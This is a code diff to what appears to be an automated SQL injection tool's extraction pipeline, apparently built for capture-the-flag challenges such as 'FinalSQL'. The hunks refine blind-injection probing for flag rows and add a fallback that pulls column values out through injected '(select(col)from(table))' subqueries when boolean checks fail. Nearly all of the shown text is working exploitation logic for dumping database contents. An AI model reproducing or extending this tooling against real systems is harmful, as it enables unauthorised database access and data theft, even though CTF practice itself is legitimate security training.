@@ -264,7 +264,7 @@ class ExtractionPipeline:
                         f"where {col} like {like_hex})")
                 except OracleError:
                     continue
-                if cnt > 0:
+                if 0 < cnt < 100:      # >100 视为表不存在时的兜底垃圾（1024 实测）
                     hit_col, hit_hex = col, like_hex
                     n_rows = min(cnt, 3 if comma_ok else 1)
                     break
@@ -396,7 +396,8 @@ class ExtractionPipeline:
         res.database = self.current_db()
         res.user = self.current_user()
         if self._is_blind():
-            quick = self._quick_flag_row()
+            quick = (None if getattr(self.s.spec, "table_hint", "")
+                     else self._quick_flag_row())
             if quick is not None:
                 quick.version, quick.user = res.version, res.user
                 return quick
@@ -417,6 +418,24 @@ class ExtractionPipeline:
                                  if c.lower() != hint.lower()][:4]
                 self.log("INFO", f"[脱库] 列名不可枚举，按提示试: {cols}")
             rows = self.try_flag_first(res.database, hint, cols)
+            if not rows:
+                # 兜底：直接读标量。FinalSQL 类环境的「SQL 报错页」与「真值页」
+                # 同形（报错也是 ERROR 文案），count/like 探测会被判成恒真而
+                # 全灭；但提示表的表达式本身合法时（表存在、单行），直接
+                # (select(col)from(table)) 能正常取值。
+                for c in cols:
+                    if self.s.stopped:
+                        break
+                    try:
+                        val = self.o.scalar(f"(select({c})from({hint}))")
+                    except OracleError:
+                        continue
+                    if val and 3 < len(val) <= 200 and val.count("~") < len(val) // 2:
+                        rows = [{c: val}]
+                        cols = [c]
+                        self._note("表名提示直读标量",
+                                   f"{res.database}.{hint}.{c} = {val[:40]}")
+                        break
             if rows:
                 res.tables[res.database] = [hint]
                 res.columns[(res.database, hint)] = cols
